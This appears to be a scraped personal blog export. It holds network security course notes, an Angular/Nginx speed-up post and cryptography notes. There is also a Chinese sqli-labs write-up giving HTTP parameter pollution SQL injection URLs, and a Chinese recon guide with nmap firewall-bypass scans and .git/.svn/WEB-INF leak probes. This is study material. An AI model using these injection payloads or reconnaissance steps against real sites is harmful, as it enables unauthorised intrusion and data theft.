<li>dedicated hardware may be needed.</li>
<li>difficult to check the encrypted traffic.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Firewall"><a href="#Firewall" class="headerlink" title="Firewall"></a>Firewall</h3><h4 id="Overview-2"><a href="#Overview-2" class="headerlink" title="Overview"></a>Overview</h4><p>A network security device that monitors incoming and outgoing network traffic and decides whether to allow or block specific traffic based on a defined set of security rules.</p>
<h4 id="Cloud-based-Web-Application-Firewall"><a href="#Cloud-based-Web-Application-Firewall" class="headerlink" title="Cloud-based Web Application Firewall"></a>Cloud-based Web Application Firewall</h4><ul>
<li>In-house hardware firewall =&gt; virtualisation</li>
<li>Reduced local cost increased service scalability</li>
<li><strong>Concern on Privacy</strong><ul>
<li>Traffic contains sensitive information</li>
<li>Rules are also proprietary</li>
<li>Threats<ul>
<li>Cloud(insider) or attacker that breaks into the cloud are interested in rules and traffic contents</li>
</ul>
</li>
</ul>
</li>
<li><strong>Concern on Integrity</strong><ul>
<li>Cheating service provider</li>
<li>Software bugs misconfigurations</li>
</ul>
</li>
</ul>
<h4 id="Sliding-window-Based-Tokenisation"><a href="#Sliding-window-Based-Tokenisation" class="headerlink" title="Sliding-window Based Tokenisation"></a>Sliding-window Based Tokenisation</h4><ul>
<li><p><code>Att-&gt;tta-&gt;tac-&gt;ack-&gt;cke-&gt;ker</code></p>
<ul>
<li>like a sliding window</li>
<li>divides the words into small windows and make rules to detect malicious words.</li>
</ul>
</li>
<li><p><strong>Issues</strong></p>
<ul>
<li><p>Will consume a lot of memory, may slow down your network.</p>
</li>
<li><p>It may drop some of non-malicious or the original legitimate traffic because you made the rules and that pattern may actually occur in other strings.</p>
</li>
<li><p>The large brandwith cost.</p>
</li>
<li><p>Frequency analysis happens will there are the same contents since the same strings will be encrypted to the same token.</p>
<ul>
<li><p><strong>Solution</strong></p>
<ul>
<li><p>Cloud firewall <strong>should only know matches</strong> on suspicious strings</p>
</li>
<li><p><strong>Adding salt</strong></p>
<ul>
<li><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221108154033521.png"></li>
<li>Trade-off<ul>
<li>The needed storage of the rules increased</li>
<li>The storage of the gateway needs to be increased(for storing counters)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>Limitations of current protocols</p>
<ul>
<li><p>The large brandwith cost due to sliding-window-based tokenisation</p>
</li>
<li><p>Limited functionality - only pattern/header matching only</p>
</li>
</ul>
</li>
</ul>
<h4 id="Stateful-amp-Stateless-Firewall"><a href="#Stateful-amp-Stateless-Firewall" class="headerlink" title="Stateful &amp; Stateless Firewall"></a>Stateful &amp; Stateless Firewall</h4><p>Stateless filrewall takes every packet independently to decide whether to drop it or not, because it does not save the state.</p>
<ul>
<li>consume a lot of resources</li>
</ul>
<p>Stateful Firewall</p>
<ul>
<li><p>Get a few packets add see if they are allowed to acually go through. </p>
</li>
<li><blockquote>
<p>Stateful firewalls <strong>intercept packets at the network layer and then derive and analyze data from all communication layers to improve security</strong>. Information about connection state and other contextual data is stored and dynamically updated.</p>
</blockquote>
</li>
<li><p>Challenges</p>
<ul>
<li>need more spaces to store the states.</li>
</ul>
</li>
</ul>
<h2 id="Week-10-BGP-and-BGP-Security"><a href="#Week-10-BGP-and-BGP-Security" class="headerlink" title="Week 10: BGP and BGP Security"></a>Week 10: BGP and BGP Security</h2><h3 id="Autonomous-System-AS"><a href="#Autonomous-System-AS" class="headerlink" title="Autonomous System (AS)"></a>Autonomous System (AS)</h3><blockquote>
<p>Autonomous System in networking is a collection of one or more associated Internet Protocol (IP) prefixes with a clearly defined <strong>routing policy</strong> that governs how the AS exchanges routing information with other autonomous systems.</p>
</blockquote>
<ul>
<li><p>ASN</p>
<ul>
<li>Autonomous System Number(ASN) is a globally unique identifier of a AS</li>
</ul>
</li>
<li><p>AS Path</p>
<ul>
<li>AS Path Attribute is a list of AS numbers that the router traverse to reach a destination IP/Network.</li>
</ul>
</li>
<li><p>BGP Speaker</p>
<ul>
<li>A router running BGP is a BGP speaker</li>
</ul>
</li>
<li><p>BGP Peer</p>
<ul>
<li>Two routers that have stablished connections for exchanging BGP information</li>
</ul>
</li>
<li><p>Types</p>
<ul>
<li>Stub AS<ul>
<li>end customers, do not provide transit to others</li>
</ul>
</li>
<li>Transit AS<ul>
<li>Provide transit to others</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Types-of-BGP-connections"><a href="#Types-of-BGP-connections" class="headerlink" title="Types of BGP connections"></a>Types of BGP connections</h3><ul>
<li>EBGP(External BGP)<ul>
<li>For BGPs from different AS</li>
</ul>
</li>
<li>IBGP(Internal BGP)<ul>
<li>For BGPs from the same AS</li>
</ul>
</li>
</ul>
<h3 id="Border-Gateway-Protocol-BGP"><a href="#Border-Gateway-Protocol-BGP" class="headerlink" title="Border Gateway Protocol (BGP)"></a>Border Gateway Protocol (BGP)</h3><h4 id="IP-Prefix-Announcement"><a href="#IP-Prefix-Announcement" class="headerlink" title="IP Prefix Announcement"></a>IP Prefix Announcement</h4><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221109101915386.png"></p>
<p><strong>Path selection</strong>: by default, the selector will choose the shortest path.</p>
<h3 id="IP-Anycast"><a href="#IP-Anycast" class="headerlink" title="IP Anycast"></a>IP Anycast</h3><ul>
<li>Multiple machines share the same IP</li>
<li>Naturally supported by BGP</li>
<li>Routing decides which one gets the packet</li>
</ul>
<h3 id="Routing-Rule"><a href="#Routing-Rule" class="headerlink" title="Routing Rule"></a>Routing Rule</h3><ul>
<li>Longest match wins<ul>
<li>e.g. packets to 10.164.0.71 will match both 10.164.0.0/25 and 10.164.0.0/24<ul>
<li>10.164.0.0/25 will be selected because it has 25 bits of the match, while the second only has 24bit of the match.</li>
</ul>
</li>
<li><strong>BGP Hijacking Attack</strong><ul>
<li>BGP does not have a mechanism to verify the ownership of a network perfix</li>
<li>Malicious BGP routers can announce fake network prefixes</li>
<li><strong>Solution</strong><ul>
<li><strong>Filtering: Active monitoring</strong><ul>
<li>Using filters, we can block the prefixes with longer lengths</li>
</ul>
</li>
<li><strong>Resource public key infrastructure</strong><ul>
<li>new route needs to be signed by a trusted authority</li>
<li>Verify the ownership of IP prefix</li>
</ul>
</li>
<li>BGPSec<ul>
<li>it is cryptographically and authenticating the whole path in BGP messages. When it reaches one of. the router, it will have signatures from everyone so that you can verify that where it comes from.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Week-11-Denial-of-Service-Attack"><a href="#Week-11-Denial-of-Service-Attack" class="headerlink" title="Week 11: Denial of Service Attack"></a>Week 11: Denial of Service Attack</h2><h3 id="Goals"><a href="#Goals" class="headerlink" title="Goals"></a>Goals</h3><ul>
<li><p>Target on availability</p>
<ul>
<li>take out a large site with little computing work</li>
</ul>
</li>
<li><p>How: amplification</p>
<ul>
<li>a small number of packets =&gt; big effect</li>
</ul>
</li>
<li><p>DoS bug -&gt; design flaw</p>
</li>
<li><p>DoS flood -&gt; command bot-net to generate a flood of requests</p>
</li>
</ul>
<h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><ul>
<li>Client puzzles<ul>
<li>given challenges</li>
<li>for TCP connection floods, the first data must contain a puzzle solution, otherwise, the TCP connection is closed.</li>
<li>for SSL hanshake DoS<ul>
<li>Challenge C based on TLS session ID</li>
<li>Server: check puzzle solution before RSA decryption</li>
</ul>
</li>
<li><strong>Limitations</strong><ul>
<li>Requires changes to both clients and servers</li>
<li>Hurts low-power legitimate clients during an attack</li>
</ul>
</li>
</ul>
</li>
<li>CAPTCHAs</li>
<li>Source identification<ul>
<li>identify packet source</li>
<li>block the attack at the source</li>
<li>Ingress filtering<ul>
<li>ISP only forwards packets with legitimate source IP</li>
</ul>
</li>
</ul>
</li>
<li>Traceback<ul>
<li>DDoS involves many packets on same path</li>
<li>Store one link in each packet</li>
</ul>
</li>
</ul>
<h3 id="Countermeasures-2"><a href="#Countermeasures-2" class="headerlink" title="Countermeasures"></a>Countermeasures</h3><ul>
<li><p>Prevent initial hack</p>
</li>
<li><p>Use of firewalls</p>
</li>
<li><p>Check ingress/egress packets</p>
</li>
<li><p>Use a server farm and load balancer to offset the effects of a DDoS attack</p>
</li>
<li><p>Change the IP address of the attacked system</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Network Security</category>
      </categories>
      <tags>
        <tag>Network Security</tag>
      </tags>
  </entry>
  <entry>
    <title>HPP参数污染攻击(sqli labs 29-31关)</title>
    <url>/2021/07/10/HPP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB-sqli-labs-29-31%E5%85%B3/</url>
    <content><![CDATA[<h1 id="HPP参数污染攻击"><a href="#HPP参数污染攻击" class="headerlink" title="HPP参数污染攻击"></a>HPP参数污染攻击</h1><h2 id="什么是HPP参数污染"><a href="#什么是HPP参数污染" class="headerlink" title="什么是HPP参数污染"></a>什么是HPP参数污染</h2><p><code>HPP</code>是(Http Parameter Pollution)的简称。简单来说，有AB两台服务器，你访问的网站实际上是先通过A服务器进行数据过滤处理然后A将过滤好的数据传给B服务器，B再传给A，最后A传给你。所以过程是：<code>User-&gt;A-&gt;B-&gt;A-&gt;User</code> 因此，A在当中充当着<code>WAF</code>的角色。 若想绕过A对参数的过滤，我们可以尝试直接请求B，因为A最终也是要请求B才能获得数据的。</p>
<span id="more"></span>

<p>那么我们可以利用不同服务器类型解析处理参数位置的不同来完成攻击，这就是HPP。</p>
<p><img src="/image/HPP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB-sqli-labs-29-31%E5%85%B3/image-20210710101238806.png" alt="image-20210710101238806"></p>
<p>假设A服务器是<code>JSP/Tomcat</code>,B服务器是<code>PHP/Apache</code>。当我们访问网站<code>www.example.com/index.php?id=1&amp;id=1</code>的时候，通过上图可知，A服务器是<code>JSP/Tomcat</code>，只接收第一个参数，而B服务器是<code>PHP/Apache</code>,接收最后一个参数。所以我们可以构造：<code>www.example.com/index.php?id=1&amp;id=-2 order by 3--+</code></p>
<h2 id="sqli-labs-第29关"><a href="#sqli-labs-第29关" class="headerlink" title="sqli labs 第29关"></a>sqli labs 第29关</h2><p><img src="/image/HPP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB-sqli-labs-29-31%E5%85%B3/image-20210710104023467.png" alt="image-20210710104023467"></p>
<p>当我们尝试注入时：</p>
<p><img src="/image/HPP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB-sqli-labs-29-31%E5%85%B3/image-20210710104057030.png" alt="image-20210710104057030"></p>
<p>被拦截。</p>
<p>查看源码：<img src="/image/HPP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB-sqli-labs-29-31%E5%85%B3/image-20210710104152453.png" alt="image-20210710104152453"></p>
<p>我们可以看到参数被检测了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">String rex = <span class="string">&quot;^\\d+$&quot;</span>;<span class="comment">//正整数</span></span><br><span class="line">Boolean <span class="keyword">match</span>=id.<span class="title function_ invoke__">matches</span>(rex);</span><br></pre></td></tr></table></figure>

<p>那么我们可以通过<code>HPP参数污染</code>绕过这个<code>WAF</code>，观察发现<code>PHP</code>代码是没有任何过滤的，我们构造代码：</p>
<p><code>http://192.168.120.128:8080/sqli-labs/Less-29/?id=1&amp;id=-1&#39; union select 1,2,3--+</code></p>
<p>接下来就可以继续注入了。</p>
<h2 id="sqli-labs-第30关"><a href="#sqli-labs-第30关" class="headerlink" title="sqli labs 第30关"></a>sqli labs 第30关</h2><p>和29关相同，只是<strong>id</strong>加了<strong>引号</strong></p>
<p>构造代码：</p>
<p><code>http://192.168.120.128:8080/sqli-labs/Less-30/?id=1&amp;id=-1&quot; union select 1,2,3--+</code></p>
<h2 id="sqli-labs-第31关"><a href="#sqli-labs-第31关" class="headerlink" title="sqli labs 第31关"></a>sqli labs 第31关</h2><p>同上，id加了(“”)</p>
<p>构造代码：</p>
<p><code>http://192.168.120.128:8080/sqli-labs/Less-31/?id=1&amp;id=-1&quot;) union select 1,2,3--+</code></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>HPP参数污染攻击的应用还有很多很多，之后还需学习</p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Sqlilabs</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>SQL Injection</tag>
        <tag>SQLilab</tag>
      </tags>
  </entry>
  <entry>
    <title>How Did I Improve My Angular Project&#39;s Loading Speed?</title>
    <url>/2023/04/28/How-Did-I-Improve-My-Angular-Project-s-Loading-Speed/</url>
    <content><![CDATA[<h1 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h1><p><a href="http://official.urls.fit/">My URL Shortener project</a> has been deployed by Kubernetes for high availability but it seems to be not perfectly “high availability” because of the low loading speed(you could even see the plain text without any style applied when you first open up the website).</p>
<p>I was trying to solve this problem by checking all <code>CSS</code> files, images, even to get rid of them, but that still did not work.</p>
<p>Another serious problem is that the pipeline ran very slowly, needing like almost 10 minutes to finish building and upload a docker image.</p>
<h1 id="Reasons"><a href="#Reasons" class="headerlink" title="Reasons"></a>Reasons</h1><ul>
<li><p>Used <code>express.js</code> to run the angular application. </p>
</li>
<li><p>Ran <code>npm i</code> and <code>npm build</code> in a docker container.</p>
</li>
<li><p><code>npm build</code> is not good for a production-level website</p>
</li>
<li><p>No resources cache was used for the website.</p>
</li>
</ul>
<h1 id="Solutions"><a href="#Solutions" class="headerlink" title="Solutions"></a>Solutions</h1><ul>
<li><p>Change <code>npm run build</code> to <code>npm run build --configuration=production -aot</code></p>
<ul>
<li><blockquote>
<p><strong>–configuration=production</strong> is typically optimized for production environments with features like minification and tree shaking enabled.</p>
</blockquote>
</li>
<li><blockquote>
<p><strong>–aot</strong> enables Ahead-of-Time (AOT) compilation. AOT compilation pre-compiles the Angular templates during the build process, resulting in faster rendering and reduced bundle size compared to Just-in-Time (JIT) compilation.</p>
</blockquote>
</li>
</ul>
</li>
<li><p>Do not run <code>npm install; npm run build</code> in <code>Dockerfile</code>, instead, all the commands to build the <code>Angular</code> application should be executed in a pipeline. Then resources will need to be copied to <code>Nginx</code> in the docker container using <code>Dockerfile</code>.</p>
</li>
<li><p>Instead of using <code>express.js</code>, use <code>Nginx</code> to handle the static resources.</p>
</li>
<li><p>Nginx <strong>Gzip</strong> compression</p>
</li>
</ul>
<p>Nginx <code>deafult.conf</code> : This change should be applied to both the Angular container and the Kubernetes node because I used Nginx to handle different API requests.</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">listen</span>  [::]:<span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span>  localhost;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#access_log  /var/log/nginx/host.access.log  main;</span></span><br><span class="line">    <span class="attribute">gzip</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">gzip_http_version</span> <span class="number">1</span>.<span class="number">1</span>;</span><br><span class="line">    <span class="attribute">gzip_disable</span>      <span class="string">&quot;MSIE [1-6]\.&quot;</span>;</span><br><span class="line">    <span class="attribute">gzip_min_length</span>   <span class="number">1100</span>;</span><br><span class="line">    <span class="attribute">gzip_vary</span>         <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">gzip_proxied</span>      expired <span class="literal">no</span>-cache <span class="literal">no</span>-store private auth;</span><br><span class="line">    <span class="attribute">gzip_types</span> text/plain application/json application/x-javascript application/javascript application/css application/xml application/xml+rss text/javascript application/x-httpd-php image/jpeg image/gif image/png image/x-ms-bmp;</span><br><span class="line">    <span class="attribute">gzip_comp_level</span>   <span class="number">6</span>;</span><br><span class="line">    <span class="section">location</span> / &#123; </span><br><span class="line">        <span class="attribute">root</span>   /usr/share/nginx/html;</span><br><span class="line">        <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#error_page  404              /404.html;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># redirect server error pages to the static page /50x.html</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="attribute">error_page</span>   <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span>  /50x.html;</span><br><span class="line">    <span class="section">location</span> = /50x.html &#123;</span><br><span class="line">        <span class="attribute">root</span>   /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h1><h2 id="Website-Loading-Speed"><a href="#Website-Loading-Speed" class="headerlink" title="Website Loading Speed"></a>Website Loading Speed</h2><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/202304281714275.png"></p>
<p>To fully load all the resources when first visiting the website, around <code>8 sec</code> is needed. This is a highly optimized result compared to the previous time(<code>over 15 sec</code>).</p>
<h2 id="Pipeline"><a href="#Pipeline" class="headerlink" title="Pipeline"></a>Pipeline</h2><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/202304281557490.png"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/202304281557118.png"></p>
<h1 id="Improvements"><a href="#Improvements" class="headerlink" title="Improvements"></a>Improvements</h1><p>There are still some issues that need to be fixed</p>
<ul>
<li><p>The loading speed can be improved further - based on the code itself.</p>
</li>
<li><p>Trying to use <code>Lazy Loading</code></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Development</category>
        <category>Angular</category>
      </categories>
      <tags>
        <tag>URL shortener</tag>
        <tag>Angular Project</tag>
      </tags>
  </entry>
  <entry>
    <title>Hash, Mac, and Digital Signature</title>
    <url>/2022/06/14/Hash-Mac-and-Digital-Signature/</url>
    <content><![CDATA[<h1 id="Hash-functions"><a href="#Hash-functions" class="headerlink" title="Hash functions"></a>Hash functions</h1><ul>
<li>One-way security<ul>
<li>h= H(m), knowing H(m) but should still be hard to find h(input)</li>
</ul>
</li>
<li>COL: collision-resistance security<ul>
<li>computationally infeasible to find any pair of distinct messages m1, m2 such that <code>h1=H(m1)</code> is equal to <code>h2=H(m2)</code></li>
<li>Find collision using <strong>≈√(2^n )=2^(n/2)</strong> random inputs to H</li>
</ul>
</li>
</ul>
<span id="more"></span>

<h1 id="Message-Authentication-Code-MAC"><a href="#Message-Authentication-Code-MAC" class="headerlink" title="Message Authentication Code(MAC)"></a>Message Authentication Code(MAC)</h1><ul>
<li><p>MAC is fast, and it has similar building blocks as symmetric key encryption.</p>
</li>
<li><p>is a many-to-one function</p>
<ul>
<li>many messages generate the same MAC</li>
</ul>
</li>
<li><p>Both Sender and Reciever can send MAC since they both have the same secret key.</p>
</li>
</ul>
<h2 id="CMAC"><a href="#CMAC" class="headerlink" title="CMAC"></a>CMAC</h2><p>CMAC is a CBC mode for authentication, and it will use the final block as a MAC.</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220614130709.png" alt="CMAC"></p>
<h2 id="HMAC"><a href="#HMAC" class="headerlink" title="HMAC"></a>HMAC</h2><p>A MAC based on a hash function.</p>
<p>HMAC(K,M)= Hash[<code>(K+ XOR opad) </code>|| <code>Hash[(K+ XOR ipad) || M)]</code> ]</p>
<h1 id="Digital-signatures"><a href="#Digital-signatures" class="headerlink" title="Digital signatures"></a>Digital signatures</h1><p>The digital signature is slow.</p>
<p><strong>Properties</strong></p>
<ul>
<li>Verifies author<ul>
<li>UNForgebale</li>
<li>Undeniable - non-repudiatable</li>
</ul>
</li>
<li>universally verifiable</li>
</ul>
<h2 id="Problems-why-use-it"><a href="#Problems-why-use-it" class="headerlink" title="Problems - why use it?"></a>Problems - why use it?</h2><p>There’s a significant risk that Alice cannot authenticate Bob. In other words, another person Peter can pretend to be Bob, and send his public key to Alice, and then Alice will generate a shared key using Peter’s public key. In this case, Peter would decrypt the messages that Alice sends to Bob.</p>
<p>This is the so-called <strong>Man in the middle attack</strong>.</p>
<p>Thus, cryptographist were trying to find a more secure way.</p>
<blockquote>
<p><strong>Digital signature</strong> is used for proving authenticity of the origin of documents as well as for non-repudiation as it can prove the authenticity of the signer.</p>
<p>Another use of digital signature is to ensure the integrity of the messages against unauthorized modification</p>
</blockquote>
<h2 id="Generate-digital-signatures"><a href="#Generate-digital-signatures" class="headerlink" title="Generate digital signatures"></a>Generate digital signatures</h2><p>![digital signatures](<a href="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/digital">https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/digital</a> signature.png)</p>
<p><strong>Generate digital signatures using RSA</strong></p>
<p>Encrypting the hashed message using the private key:</p>
<p><code>s = m^d (mod n)</code></p>
<p>Decrypting the hashed message using the public key:</p>
<p><code>m = s^e (mod n)</code></p>
<h2 id="Security"><a href="#Security" class="headerlink" title="Security"></a>Security</h2><blockquote>
<p><strong>Attack capability</strong>: attacker knows signer’s public key pk</p>
<p><strong>Chosen-message attacks(CMA)</strong></p>
<ul>
<li>should be unforgeable even if the attacker can see many valid signatures on many messages, even messages chosen by the attacker.</li>
</ul>
<p>Attack goal:</p>
<ul>
<li>Existential UnForgeability <strong>(EUF):</strong><ul>
<li>Should be infeasible for an attacker to produce <strong>any</strong> valid (msg, sig) pair where msg <strong>has not been signed by the honest signer</strong> (even for randomly looking msg)</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>Monash Uni FIT2093</p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Cryptography</category>
      </categories>
      <tags>
        <tag>cryptography</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全之信息收集</title>
    <url>/2021/05/30/Information-Gathering/</url>
    <content><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Information Gathering is to gather different kinds of information against the targeted victim or system - Websites, servers, etc.</p>
<h2 id="Identify-Operation-System"><a href="#Identify-Operation-System" class="headerlink" title="Identify Operation System"></a>Identify Operation System</h2><span id="more"></span>

<h3 id="通过网站文件大小写来识别"><a href="#通过网站文件大小写来识别" class="headerlink" title="通过网站文件大小写来识别"></a>通过网站文件大小写来识别</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Linux对大小写敏感，windows不敏感 - 比如index.html -&gt; index.Html</span><br><span class="line">若网页不能正常显示，则为Linux系统；若能正常显示，则为windows系统</span><br></pre></td></tr></table></figure>

<h3 id="通过ping的TTL值来识别"><a href="#通过ping的TTL值来识别" class="headerlink" title="通过ping的TTL值来识别"></a>通过ping的TTL值来识别</h3><p><br />TTL值可作为参考，其依然有可能被修改 </p>
<pre><code><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">WINDOWS</span> <span class="number">98</span> TTL:<span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">LINUX</span> <span class="number">2</span>.<span class="number">2</span>X/<span class="number">2</span>.<span class="number">4</span>X TTL:<span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">WINDOWS</span> NT/<span class="number">2000</span>/XP TTL:<span class="number">128</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">UNIX</span>/BSD TTL:<span class="number">255</span></span><br></pre></td></tr></table></figure>
</code></pre>
<p><strong>例如以我本地电脑MAC(Linux)为例，ttl为64，所以可判断为linux</strong></p>
<p><img src="/image/information-Gathering/1-2530916.png" alt="1"></p>
<h3 id="通过组合对应来识别"><a href="#通过组合对应来识别" class="headerlink" title="通过组合对应来识别"></a>通过组合对应来识别</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ASP和ASP.NET(aspx) -&gt; windows</span><br><span class="line">aspx mssql windows iis</span><br><span class="line">php mysql windows/linux apache</span><br><span class="line">jsp mssql/oracle windows/linux tomcat</span><br><span class="line">javaee mysql/oracle/ windows/linux weblogic/jboos/tomcat</span><br></pre></td></tr></table></figure>
<h3 id="通过抓包来识别"><a href="#通过抓包来识别" class="headerlink" title="通过抓包来识别"></a>通过抓包来识别</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">在==header==中可看到server信息</span><br></pre></td></tr></table></figure>

<p>例如：某游戏网站，可判断其为windows, aspx类</p>
<p><img src="/image/information-Gathering/image-20210601160243421.png" alt="image-20210601160243421"></p>
<h3 id="通过端口扫描来识别（包括nmap绕过防火墙）"><a href="#通过端口扫描来识别（包括nmap绕过防火墙）" class="headerlink" title="通过端口扫描来识别（包括nmap绕过防火墙）"></a>通过端口扫描来识别（包括nmap绕过防火墙）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">可以通过扫描端口来判断数据库类型 - 可使用masscan或nmap来扫描</span><br><span class="line">nmap中文手册：http://www.nmap.com.cn/doc/manual.shtm</span><br><span class="line">nmap www.example.com</span><br><span class="line">nmap -O -A www.example.com</span><br><span class="line">nmap -Pn -O -A www.example.com</span><br><span class="line">扫网段： nmap 47.94.236.0/24</span><br><span class="line">如果开了防火墙:用nmap会提示Host seems down</span><br><span class="line">绕过防火墙：nmap -Pn 127.0.0.1</span><br></pre></td></tr></table></figure>

<h3 id="通过网站文件类型来识别"><a href="#通过网站文件类型来识别" class="headerlink" title="通过网站文件类型来识别"></a>通过网站文件类型来识别</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">如 index.jsp, index.aspx, index.php, index.action, index.asp</span><br><span class="line">另外，压缩包文件：</span><br><span class="line">Windows -&gt; zip, rar</span><br><span class="line">linux -&gt; tar.gz</span><br></pre></td></tr></table></figure>

<h2 id="Get-Relative-Sites-Information"><a href="#Get-Relative-Sites-Information" class="headerlink" title="Get Relative Sites Information"></a>Get Relative Sites Information</h2><h3 id="获取子域名网站"><a href="#获取子域名网站" class="headerlink" title="获取子域名网站"></a>获取子域名网站</h3><p>可利用子域名查询平台或者工具进行获取</p>
<p>推荐： oneforall  下载地址：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p>
<h3 id="获取不同端口"><a href="#获取不同端口" class="headerlink" title="获取不同端口"></a>获取不同端口</h3><p>不同端口可能有不同的网站，增加attack的几率</p>
<p>推荐：nmap, masscan</p>
<h2 id="Get-Source-Code-of-Taget-Sites"><a href="#Get-Source-Code-of-Taget-Sites" class="headerlink" title="Get Source Code of Taget Sites"></a>Get Source Code of Taget Sites</h2><h3 id="获取当前网站的CMS版本信息"><a href="#获取当前网站的CMS版本信息" class="headerlink" title="获取当前网站的CMS版本信息"></a>获取当前网站的CMS版本信息</h3><ul>
<li><p>使用在线平台查询（RECOMMAND）</p>
<p>国外：<a href="https://whatcms.org/">https://whatcms.org/</a> -&gt; 适用于国外的CMS</p>
<p>国内：<a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a> -&gt; 适用于国内的CMS</p>
</li>
<li><p>使用工具查询</p>
<p>工具：<a href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a> -&gt;线下比赛没有网络环境</p>
</li>
<li><p>使用 Github 监控</p>
<p><a href="http://sc.ftqq.com/3.version">http://sc.ftqq.com/3.version</a> 申请-配置-写入-测试</p>
</li>
<li><p>通过关键字/文件名/url配合搜索引擎查询</p>
</li>
</ul>
<h3 id="获取网站源码"><a href="#获取网站源码" class="headerlink" title="获取网站源码"></a>获取网站源码</h3><p><strong>一般来说获取某些小型站点（套用模版或者第三方程序）的网站源码是有可能的。</strong></p>
<p><a href="https://www.secpulse.com/archives/124398.html">More Information About Source Code leakage</a></p>
<h4 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title="git源码泄漏"></a>git源码泄漏</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www.example.com/.git/</span><br><span class="line">存在即可用==githack==利用漏洞</span><br></pre></td></tr></table></figure>

<h4 id="svn源码泄漏"><a href="#svn源码泄漏" class="headerlink" title="svn源码泄漏"></a>svn源码泄漏</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www.example.com/.svn/</span><br><span class="line">存在即可用==svn工具==利用漏洞</span><br></pre></td></tr></table></figure>

<h4 id="WEB-INF泄露"><a href="#WEB-INF泄露" class="headerlink" title="WEB-INF泄露"></a>WEB-INF泄露</h4><blockquote>
<p>WEB-INF 主要包含一下文件或目录：</p>
<p>WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.</p>
<p>WEB-INF/database.properties : 数据库配置文件</p>
<p>WEB-INF/classes/ : 一般用来存放Java类文件(.class)</p>
<p>WEB-INF/lib/ : 用来存放打包好的库(.jar)</p>
<p>WEB-INF/src/ : 用来放源代码(.asp和.php等)</p>
</blockquote>
